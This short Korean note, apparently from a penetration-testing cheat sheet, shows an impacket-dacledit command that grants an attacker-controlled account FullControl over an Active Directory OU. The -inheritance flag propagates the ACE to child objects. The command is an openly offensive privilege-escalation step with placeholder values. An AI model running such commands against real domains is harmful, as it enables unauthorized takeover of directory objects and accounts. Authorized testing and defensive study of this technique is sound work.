# OU 대상

-inheritance 플래그로 하위 오브젝트에 ACE를 전파한다.

```bash
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -inheritance \
  -principal <공격자계정> \
  -target-dn 'OU=<대상OU>,DC=<도메인>,DC=LOCAL'  # ← 수정
```